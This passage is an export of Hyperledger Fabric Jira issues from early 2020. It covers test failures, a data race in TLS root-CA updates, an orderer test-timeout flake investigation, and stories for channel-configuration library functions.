--- FAIL: TestUpdateRootsFromConfigBlock (18.80s)
    --- FAIL: TestUpdateRootsFromConfigBlock/MutualTLSOrg1Org2 (2.18s)
        pkg_test.go:278: Running test MutualTLSOrg1Org2 ...
        pkg_test.go:300: listenAddress: 127.0.0.1:33485
        pkg_test.go:302: testAddress: localhost:33485
        pkg_test.go:191: Channel channel2 MSPIDs: ([Org2MSP SampleOrg])
        testing.go:853: race detected during execution of test
    testing.go:853: race detected during execution of test
FAIL
coverage: 68.9% of statements
FAIL	github.com/hyperledger/fabric/core/peer	39.904s
{code}

{code}
==================
WARNING: DATA RACE
Write at 0x00c001242690 by goroutine 216:
  github.com/hyperledger/fabric/core/comm.(*GRPCServer).SetClientRootCAs()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/comm/server.go:293 +0x315
  github.com/hyperledger/fabric/core/peer.(*Peer).updateTrustedRoots()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/peer.go:113 +0x5c4
  github.com/hyperledger/fabric/core/peer.(*Peer).createChannel.func2()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/peer.go:282 +0x79
  github.com/hyperledger/fabric/common/channelconfig.(*BundleSource).Update()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/channelconfig/bundlesource.go:46 +0xaf
  github.com/hyperledger/fabric/core/peer.(*Peer).createChannel()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/common/channelconfig/bundlesource.go:38 +0xae1
  github.com/hyperledger/fabric/core/peer.(*Peer).CreateChannel()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/peer.go:219 +0x28f
  github.com/hyperledger/fabric/core/peer_test.TestUpdateRootsFromConfigBlock.func1()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/pkg_test.go:187 +0x123
  github.com/hyperledger/fabric/core/peer_test.TestUpdateRootsFromConfigBlock.func3()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/pkg_test.go:250 +0x64
  github.com/hyperledger/fabric/core/peer_test.TestUpdateRootsFromConfigBlock.func5()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/pkg_test.go:310 +0x87c
  testing.tRunner()
      /usr/local/go/src/testing/testing.go:909 +0x199

Previous read at 0x00c001242690 by goroutine 128:
  crypto/tls.(*Conn).processCertsFromClient()
      /usr/local/go/src/crypto/tls/handshake_server.go:730 +0x405
  crypto/tls.(*serverHandshakeState).doFullHandshake()
      /usr/local/go/src/crypto/tls/handshake_server.go:514 +0xa23
  crypto/tls.(*serverHandshakeState).handshake()
      /usr/local/go/src/crypto/tls/handshake_server.go:105 +0x68c
  crypto/tls.(*Conn).serverHandshake()
      /usr/local/go/src/crypto/tls/handshake_server.go:60 +0x1cd
  crypto/tls.(*Conn).Handshake()
      /usr/local/go/src/crypto/tls/conn.go:1364 +0x3cc
  github.com/hyperledger/fabric/core/comm.(*serverCreds).ServerHandshake()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/comm/creds.go:60 +0x145
  github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).useTransportAuthenticator()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:517 +0x92
  github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).handleRawConn()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:642 +0x157
  github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).Serve.func3()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:628 +0x4c

Goroutine 216 (running) created at:
  testing.(*T).Run()
      /usr/local/go/src/testing/testing.go:960 +0x651
  github.com/hyperledger/fabric/core/peer_test.TestUpdateRootsFromConfigBlock()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/peer/pkg_test.go:277 +0x330f

Goroutine 128 (finished) created at:
  github.com/hyperledger/fabric/vendor/google.golang.org/grpc.(*Server).Serve()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/vendor/google.golang.org/grpc/server.go:627 +0x960
  github.com/hyperledger/fabric/core/comm.(*GRPCServer).Start()
      /home/sykesm/workspace/fabric/src/github.com/hyperledger/fabric/core/comm/server.go:224 +0x1de
{code}",,sykesm,tsharris,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzzzjzz",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,tsharris,yacovm,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-1.4,release-2.5,release-2.4,release-2.1,main,release-2.0,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"03/Apr/20 3:57 AM;tsharris;[https://github.com/hyperledger/fabric/pull/967];;;","10/Apr/20 4:52 AM;yacovm;This is a data race in the production code so let's backport this;;;","10/Apr/20 6:17 AM;tsharris;[https://github.com/hyperledger/fabric/pull/1050]

[https://github.com/hyperledger/fabric/pull/1051|https://github.com/hyperledger/fabric/pull/1050]

[https://github.com/hyperledger/fabric/pull/1052|https://github.com/hyperledger/fabric/pull/1050];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Unit test failure in config package,FAB-17541,44422,,Bug,Closed,FAB,Fabric,software,denyeart,,,High,Done,,sykesm,sykesm,26/Feb/20 8:49 PM,17/Mar/20 4:16 AM,28/Oct/23 3:09 AM,26/Feb/20 11:01 PM,v2.0.0,,,,,,,,,,,,,fabric-common,,,,,,,,,0,ipm,,,,,"Looks like it broke between merging changes from [~wlahti] and [~tsharris].

{code}
--- FAIL: TestAddOrgToConsortiumFailures (0.01s)
    --- FAIL: TestAddOrgToConsortiumFailures/When_the_config_doesn't_contain_the_consortium#01 (0.00s)
        config_test.go:790: 
            Expected
                <*errors.errorString | 0xc000378e50>: {
                    s: ""failed to create consortium org: no Admins policy defined"",
                }
            to match error
                <string>: failed to create consortium org: failed to add policies: no Admins policy defined
    --- FAIL: TestAddOrgToConsortiumFailures/When_the_channel_ID_is_not_specified (0.03s)
        config_test.go:790: 
            Expected
                <*errors.errorString | 0xc0000756a0>: {
                    s: ""channel ID is required"",
                }
            to match error
                <string>: channel ID is empty
FAIL
coverage: 89.3% of statements
FAIL	github.com/hyperledger/fabric/pkg/config	0.168s
{code}",,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzw",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Feb/20 8:56 PM;sykesm;https://github.com/hyperledger/fabric/pull/746;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Investigate cause and mitigations for FAB-16233,FAB-17542,44423,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,26/Feb/20 9:34 PM,27/Feb/20 11:43 PM,28/Oct/23 3:09 AM,27/Feb/20 11:43 PM,v2.0.0,,,,,,,,,,,,,fabric-orderer,,,,,,,,,0,ipm,,,,,"*TIMEBOXED* - 3 hours

We are all familiar with the 20 minute timeout flake that happens in the orderer. Those most familiar with that code have not fixed it since it started happening last summer. (Complexity has a cost.)

The task is to audit the code and attempt to do one of two things:

1. Fix the problem
2. Add a mitigation that will not allow tests to run longer than 3-5 minutes before failing.

From a very quick scan of the stacks, it seems like {{orderer/common/cluster/deliver_test.go:184}} is in most (all?) of the stacks. Perhaps this receive should be dropped into a select against a timer of 2 or 3 minutes...",,caod,sykesm,tsharris,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Feb/20 4:46 AM;caod;replicate_test_flake.txt;https://jira.hyperledger.org/secure/attachment/18145/replicate_test_flake.txt",,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzx",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,tsharris,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"27/Feb/20 5:06 AM;caod;From out initial investigation of one instance of this flake in CI (see attached logs), we found that in this particular failure, the {{[TestReplicateChainsGreenPath|[https://github.com/hyperledger/fabric/blob/master/orderer/common/cluster/replication_test.go#L413]]}} is the test that surfaces the 20m timeout. The goroutines imply another 20m timeout from {{deliver_test}} around reading from {{[ds.seekAssertions|[https://github.com/hyperledger/fabric/blob/master/orderer/common/cluster/deliver_test.go#L184]]}} that is likely a side effect of the ReplicateChains timeout. We've decided to add a 1min timeout around the {{r.ReplicateChains()}} call in the {{replication_test}} as well as around the deliver server's {{seekAssertions}} channel to ensure any other tests that might use that path can also timeout properly if {{seekAssertions}} somehow never receives. Regarding the root cause, when comparing the failing logs to a successful test run, the test hangs when attempting to probe for whether to pull from Channel B:
{code:java}
2020-02-25T21:12:32.4491922Z [34m2020-02-25 20:52:54.002 UTC [test] channelsToPull -> INFO 3b9[0m Probing whether I should pull channel B
2020-02-25T21:12:32.4492905Z [34m2020-02-25 20:52:54.004 UTC [test] fetchLastBlockSeq -> INFO 3ba[0m 127.0.0.1:36683 is at block sequence of 30
2020-02-25T21:12:32.4493923Z [34m2020-02-25 20:52:54.005 UTC [test] HeightsByEndpoints -> INFO 3bb[0m Returning the heights of OSNs mapped by endpoints map[127.0.0.1:36683:31]
2020-02-25T21:12:32.4494984Z [34m2020-02-25 20:52:54.010 UTC [test] fetchLastBlockSeq -> INFO 3bc[0m 127.0.0.1:36683 is at block sequence of 30
2020-02-25T21:12:32.4496061Z [34m2020-02-25 20:52:54.011 UTC [test] connectToSomeEndpoint -> INFO 3bd[0m Connected to 127.0.0.1:36683 with last block seq of 30
2020-02-25T21:12:32.4497019Z [34m2020-02-25 20:52:54.011 UTC [test] obtainStream -> INFO 3be[0m Sending request for block [30] to 127.0.0.1:36683
2020-02-25T21:12:32.4497926Z [34m2020-02-25 20:52:54.013 UTC [test] pullBlocks -> INFO 3bf[0m Got block [30] of size 0 KB from 127.0.0.1:36683
2020-02-25T21:12:32.4498896Z [31m2020-02-25 20:52:54.016 UTC [test] fetchLastBlockSeq -> ERRO 3c0[0m Failed receiving the latest block from 127.0.0.1:36683: EOF
2020-02-25T21:12:32.4499919Z [33m2020-02-25 20:52:54.017 UTC [test] func1 -> WARN 3c1[0m Received error of type 'EOF' from {""CAs"":null,""Endpoint"":""127.0.0.1:36683""}
2020-02-25T21:12:32.4501115Z [33m2020-02-25 20:52:54.017 UTC [test] connectToSomeEndpoint -> WARN 3c2[0m Could not connect to any endpoint of [{""CAs"":null,""Endpoint"":""127.0.0.1:36683""}]
{code}
The above {{Failed receiving the latest block from 127.0.0.1:36683: EOF}} implies that we were unable to fetch the configuration block [21] which would determine if channel B could be pulled from. In a successful test we would expect the following lines when probing B (notice we successfully pulled the configuration block [21] indicating we do not belong in Channel B):

{code:java}
2020-02-26 15:04:44.743 EST [test] channelsToPull -> INFO 01e Probing whether I should pull channel B
2020-02-26 15:04:44.744 EST [test] fetchLastBlockSeq -> INFO 01f 127.0.0.1:57953 is at block sequence of 30
2020-02-26 15:04:44.744 EST [test] HeightsByEndpoints -> INFO 020 Returning the heights of OSNs mapped by endpoints map[127.0.0.1:57953:31]
2020-02-26 15:04:44.745 EST [test] fetchLastBlockSeq -> INFO 021 127.0.0.1:57953 is at block sequence of 30
2020-02-26 15:04:44.745 EST [test] connectToSomeEndpoint -> INFO 022 Connected to 127.0.0.1:57953 with last block seq of 30
2020-02-26 15:04:44.745 EST [test] obtainStream -> INFO 023 Sending request for block [30] to 127.0.0.1:57953
2020-02-26 15:04:44.745 EST [test] pullBlocks -> INFO 024 Got block [30] of size 0 KB from 127.0.0.1:57953
2020-02-26 15:04:44.746 EST [test] fetchLastBlockSeq -> INFO 025 127.0.0.1:57953 is at block sequence of 30
2020-02-26 15:04:44.746 EST [test] connectToSomeEndpoint -> INFO 026 Connected to 127.0.0.1:57953 with last block seq of 30
2020-02-26 15:04:44.746 EST [test] obtainStream -> INFO 027 Sending request for block [21] to 127.0.0.1:57953
2020-02-26 15:04:44.746 EST [test] pullBlocks -> INFO 028 Got block [21] of size 0 KB from 127.0.0.1:57953
2020-02-26 15:04:44.746 EST [test] channelsToPull -> INFO 029 I do not belong to channel B or am forbidden pulling it (not in the channel), skipping chain retrieval
{code}
The 1min timeout should fail faster when we encounter this bug again but it would be nice to do more investigation into the root cause for why we could not receive the configuration block.;;;","27/Feb/20 5:31 AM;caod;On investigating other errors related to timing out in this test, it doesn't seem to be limited to the ReplicationTest but all seem to timeout on the seekAssertions. We're going to remove the timeout for ReplicateChains and instead just leave the one on seekAssertions as that should cover every case that seems to be timing out when seekAssertions is not receiving.;;;","27/Feb/20 5:39 AM;tsharris;[https://github.com/hyperledger/fabric/pull/749];;;","27/Feb/20 5:48 AM;caod;I thought about it some more and I think I have a theory regarding the root cause. This is just a hunch but I'm thinking the deliver server's [Deliver|[https://github.com/hyperledger/fabric/blob/master/orderer/common/cluster/deliver_test.go#L171-L198]] is being called more times than expected (whether due to some retry logic from any failure that may happen in that path). Each time Deliver is called it pulls a seekAssertion off the channel (we only put a set number of seekAssertions on the channel during setup, and that's assuming nothing in the test flakes out normally). Each failure that causes a retry or a new unexpected call to Deliver is thus pulling another seekAssertion off the channel until eventually it's empty and thus hangs waiting for another seekAssertion (but there won't be any more since we only put an expected number in the channel). If that's truly what's causing the hanging then I'd propose we should look into a way of maintaining the number of seekAssertions remaining whenever a Deliver needs to be called again.;;;","27/Feb/20 7:43 AM;yacovm;{quote}I'd propose we should look into a way of maintaining the number of seekAssertions remaining whenever a Deliver needs to be called again.
{quote}
 

The seek assertions are there to ensure the block pulling logic is behaving as expected. 
 Since the test dictates what kind of block to send according to the seek sent from the production code, then won't it mask (in theory) possible problems that may occur in production, where the responses to the seeks are not controlled by the test?

 

If you ask me, these ""Received error of type EOF"" are probably due to the server side returning nil, hence tearing down the gRPC stream.

This happens because of putting nil in the channel as seen below:
{code:java}
// Orderer returns its last block is 30.
// This is needed to get the latest height by comparing among all orderers.
osn.enqueueResponse(30)

// First we poll for the block sequence we got previously again, from some orderer.
osn.addExpectProbeAssert()
osn.enqueueResponse(30)

// And afterwards pull the block from the first orderer.
osn.addExpectPullAssert(30)
osn.blockResponses <- &orderer.DeliverResponse{
   Type: &orderer.DeliverResponse_Block{Block: block30WithConfigBlockOf21},
}
// And the last config block is pulled via reconnecting to the orderer.
osn.blockResponses <- nil {code}
In conjunction to the deliver blocks method which returns nil in case a nil is in the channel:
{code:java}
func (ds *deliverServer) deliverBlocks(stream orderer.AtomicBroadcast_DeliverServer) error {
   for {
      blockChan := ds.blocks()
      response := <-blockChan
      // A nil response is a signal from the test to close the stream.
      // This is needed to avoid reading from the block buffer, hence
      // consuming by accident a block that is tabled to be pulled
      // later in the test.
      if response == nil {
         return nil
      }
      if err := stream.Send(response); err != nil {
         return err
      }
   }
}
 {code}
Now, that was on purpose because it's a hacky way of making the gRPC test server to close the stream after delivering the block.

I think that it is best to mock the gRPC service here (it is done in all kinds of places in the Fabric code base, when needed, but not here) and see if it solves the flakes for this test.;;;","27/Feb/20 11:43 PM;sykesm;Mitigation was added in https://github.com/hyperledger/fabric/pull/749. The change simply prevents the blocking channel receive to hang out for more than a minute before killing the tests.

This change is *not* a fix; merely a mitigation to prevent 20 minute hangs during test in CI.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function that adds an anchor peer,FAB-17543,44426,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,caod,sykesm,sykesm,26/Feb/20 10:14 PM,17/Mar/20 4:18 AM,28/Oct/23 3:09 AM,05/Mar/20 2:26 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a fabric administrator, I want to use a fit-for-purpose library that can modify an existing channel configuration to add an anchor peer.

Acceptance:
Starting with an existing Config block/transaction, I can call a function that adds an anchor peer to the configuration. After performing that operation, I can compute a ConfigUpdate transaction that is ready for a signature workflow.

https://hyperledger-fabric.readthedocs.io/en/release-1.4/channel_update_tutorial.html#updating-the-channel-config-to-include-an-org3-anchor-peer-optional",,caod,sykesm,xwu,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17544,FAB-17591,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzz",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,xwu,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Feb/20 3:31 PM;xwu;My initial thoughts on this issue are as follows.

func AddAnchorPeer(baseConfig *cb.Config, orgName string, anchor *AnchorPeer) (*cb.Config, error) {
      ......
}
In the implementation of this function, there are three main situations that need to be considered.
1. if the baseConfig(channel_group.Groups[Application].groups[]) does not have the orgName, return error
2. if the org already has anchors, then append the anchor to the array of anchor_peers and add the version. In this case, we should confirm whether the anchor to be added is already in the list
3. if the org does not have any anchor info, we should init the AnchorPeers struct with anchor. Then set version to be 0 and the mod_policy is the same as MSP's mod_policy;;;","04/Mar/20 12:55 AM;caod;[https://github.com/hyperledger/fabric/pull/760];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function that removes an anchor peer,FAB-17544,44427,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tsharris,sykesm,sykesm,26/Feb/20 10:15 PM,17/Mar/20 4:18 AM,28/Oct/23 3:09 AM,04/Mar/20 12:54 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a fabric administrator, I want to use a fit-for-purpose library that can modify an existing channel configuration to remove an anchor peer.

Acceptance:
Starting with an existing Config block/transaction, I can call a function that removes an anchor peer from the configuration. After performing that operation, I can compute a ConfigUpdate transaction that is ready for a signature workflow.

https://hyperledger-fabric.readthedocs.io/en/release-1.4/channel_update_tutorial.html#updating-the-channel-config-to-include-an-org3-anchor-peer-optional",,caod,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17543,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzi",,,,Unset,Unset,,(Please add steps to reproduce),1.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),caod,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"04/Mar/20 12:54 AM;caod;[https://github.com/hyperledger/fabric/pull/765];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to revoke a certificate issued by an MSP,FAB-17545,44429,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,sykesm,sykesm,26/Feb/20 10:25 PM,20/Mar/20 12:47 AM,28/Oct/23 3:09 AM,20/Mar/20 12:47 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As a fabric administrator, I want to use a fit for purpose library to generate a configuration update that revokes a certificate issued by my organization's MSP.

Acceptance:
 Provided with a config block/transaction, I can call a function to ""revoke"" a certificate issued by an MSP. This should result in a configuration update that appropriately modifies the {{revocation_list}} attribute of {{FabricMSPConfig}}.",,dereckluo,sykesm,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17587,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzr",,,,Unset,Unset,,(Please add steps to reproduce),3.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,sykesm,wlahti,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Feb/20 12:55 AM;sykesm;MSP is hard.;;;","06/Mar/20 12:42 AM;dereckluo;https://github.com/hyperledger/fabric/pull/795
;;;","06/Mar/20 12:42 AM;wlahti;Split the validation portion of this story into a separate JIRA: https://jira.hyperledger.org/browse/FAB-17587;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Implement function to add a root CA to an MSP,FAB-17546,44430,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,sykesm,sykesm,26/Feb/20 10:30 PM,20/Mar/20 1:42 AM,28/Oct/23 3:09 AM,20/Mar/20 12:46 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"As an administrator, I want to use a fit for purpose library to add a new root CA certificate to an MSP configuration.

Acceptance:
Starting with a configuration transaction/block, I can call a function that adds CA certificate to the MSP configuration. After this operation, I should be able to create a config update transaction that is ready for the signature workflow.

Minimal certificate validation should be done when processing the function. In particular, reject certificates that is missing the KeyUsageCertSign/CA attributes.",,dereckluo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-17628,,,No,,Unset,No,,,"1|i00n2e:8znqzzw",,,,Unset,Unset,,(Please add steps to reproduce),2.0,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"06/Mar/20 12:42 AM;dereckluo;https://github.com/hyperledger/fabric/pull/795;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cache the result of loading configuration profile during unit tests,FAB-17547,44431,,Task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,dereckluo,sykesm,sykesm,26/Feb/20 10:55 PM,04/Mar/20 3:07 AM,28/Oct/23 3:09 AM,04/Mar/20 12:00 AM,,,,,,,,,,v2.1.0,,,,fabric-common,,,,,,,,,0,ipm,,,,,"While looking into why unit tests were taking so long, I opened FAB-17508. That issue describes the inefficiencies involved in supporting configuration structures that can be overridden with viper and that may require additional processing with the {{mapstructure}} package.

Given the current requirements, I don't see any easy, non-invasive way to improve that implementation...

Since we now know {{EnhancedExactUnmarshal}} is expensive (_incredibly_ expensive in tests that are run with the race detector), we need to do a little extra work to reduce the frequency with which we call it.

The task is simple:

Where possible, cache the results of {{EnhancedExactUnmarshal}}. When multiple calls are made to retrieve the same profile from the same configuration path, return a clone of the cached object.

A (poor, over-engineered) example can be seen here: 

https://github.com/hyperledger/fabric/pull/732/files

In the case of the change above, there's only profile that's accessed so the map really wasn't necessary. The round-trip marshaling that is done allows the test cases to modify what comes back.

Using that approach, if we are willing to accept slightly higher risk, it may be possible to add a production cache directly to the direct consumers (orderer/common/localconfig, internal/configtxgen/genesisconfig). If we go down this path, the cache key should be the path of the configuration file that was used.",,dereckluo,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00n2e:8znqzyi",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),dereckluo,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"28/Feb/20 6:23 AM;dereckluo;https://github.com/hyperledger/fabric/pull/758;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
intermittent test failure in grpclogging server test,FAB-17548,44432,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,btl5037,btl5037,26/Feb/20 11:06 PM,18/Mar/20 4:40 PM,28/Oct/23 3:09 AM,18/Mar/20 4:40 PM,,,,,,,,,,v2.0.2,,,,fabric-common,,,,,,,,,0,ci-flake,,,,,"[https://dev.azure.com/Hyperledger/Fabric/_build/results?buildId=8497&view=logs&j=ebb37e22-1b6b-50bf-588e-4a3b10a4fc3d&t=5e6c925f-2981-5207-dd06-5e1b24383e25&l=364]
{code:java}
• Failure in Spec Setup (BeforeEach) [0.562 seconds]
Server
/home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/grpclogging/server_test.go:36
  StreamServerInterceptor
  /home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/grpclogging/server_test.go:356
    when the stream ends with an unknown error
    /home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/grpclogging/server_test.go:518
      logs the unknown code [BeforeEach]
      /home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/grpclogging/server_test.go:534

      Expected error:
          <*errors.errorString | 0xc000036050>: {s: ""EOF""}
          EOF
      not to have occurred

      /home/vsts/work/1/go/src/github.com/hyperledger/fabric/common/grpclogging/server_test.go:529
{code}",,btl5037,sykesm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i019jn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,sykesm,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"26/Feb/20 11:07 PM;btl5037;This package has had many flakes over the years, adding yet another one;;;","18/Mar/20 5:00 AM;sykesm;> over the years

It's not even 18 months old yet.;;;","18/Mar/20 5:14 AM;btl5037;Hey, thats 2018, 2019, and 2020. Semantic's :)

But the sentiment stands this is the 9th Jira on the package in 18 months;;;","18/Mar/20 5:34 AM;sykesm;>  9th Jira on the package in 18 months

A small drop in the bucket relative to the private data suite, gossip, orderer server, and orderer etcdraft.

21 commits total:
{code}
     1  7ed2fe3fd       Matthew Sykes   Thu Feb 27 15:54:10 2020 -0500  Replace gogo proto imports with golang proto (#757)
     2  d398f2a23       seo kyungsik    Tue Sep 24 19:55:24 2019 +0900  [FAB-16628] staticcheck - common
     3  01a250616       Matthew Sykes   Thu Sep 12 14:35:29 2019 +0000  Stop referencing GOPATH in go:generate directives
     4  4ca501e81       Matthew Sykes   Wed Sep 11 21:32:05 2019 +0000  Regenerate fakes and mocks with current tooling
     5  fb22878a4       Matthew Sykes   Wed Sep 11 21:01:08 2019 +0000  Stop referencing GOPATH in compile_protos.sh
     6  957e218dc       Matthew Sykes   Thu Aug 29 15:56:53 2019 -0400  Move to hyperledger/fabric-protos-go
